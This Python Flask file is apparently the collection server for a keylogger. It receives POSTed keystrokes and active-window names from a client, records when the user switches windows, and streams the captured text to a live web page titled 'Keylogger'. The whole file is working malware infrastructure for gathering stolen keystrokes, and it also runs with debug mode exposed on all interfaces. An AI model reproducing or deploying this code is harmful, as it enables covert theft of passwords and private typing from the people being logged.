from flask import Flask, request, render_template_string, jsonify  # Import Flask to create the web server and handle requests

app = Flask(__name__)  # Initialize the Flask application

# Global variables to store pressed keys and the active window
key_log = ""  # String to store the key log
current_window = "Unknown"  # Stores the name of the active window

# HTML template to display the key logs and active window in the browser
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Keylogger</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        #log { white-space: pre-wrap; background: #f4f4f4; padding: 10px; border-radius: 5px; }
        #window { font-weight: bold; color: red; }
    </style>
    <script>
        function updateLog() {
            fetch('/view')
                .then(response => response.text())
                .then(data => { document.getElementById('log').innerText = data; });
        }
        function updateWindow() {
            fetch('/window')
                .then(response => response.text())
                .then(data => { document.getElementById('window').innerText = data; });
        }
        setInterval(updateLog, 1000);
        setInterval(updateWindow, 1000);
    </script>
</head>
<body>
    <h1>Key Monitoring</h1>
    <p>Active application or site: <span id="window"></span></p>
    <div id="log">Waiting for keys...</div>
</body>
</html>
"""

@app.route("/")
def index():
    """Main route that renders the HTML template."""
    return render_template_string(html_template)

@app.route("/log", methods=["POST"])
def receive_key():
    """Route to receive key press data sent by the client."""
    global key_log, current_window
    try:
        data = request.json  # Get the POST request data in JSON format
        key = data.get("key", "")  # Get the pressed key
        window = data.get("window", "Unknown")  # Get the active window

        # Check if the window has changed
        if window != current_window:
            key_log += f"\n\n🔴 [The user switched to: {window}]\n"
            current_window = window

        # Log the pressed key
        if key == "\b":  # If the key is backspace
            key_log = key_log[:-1]  # Remove the last character from the log
        else:
            key_log += key  # Add the key to the log

        print(f"Key received: {key}")

        return jsonify({"status": "success", "message": "Key logged"}), 200  # Return a success response

    except Exception as e:
        print(f"Error logging key: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500  # Return an error response

@app.route("/view")
def view_log():
    """Route to view the key log."""
    return key_log

@app.route("/window")
def view_window():
    """Route to view the active window."""
    return current_window

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)  # Start the Flask server to run locally on port 5000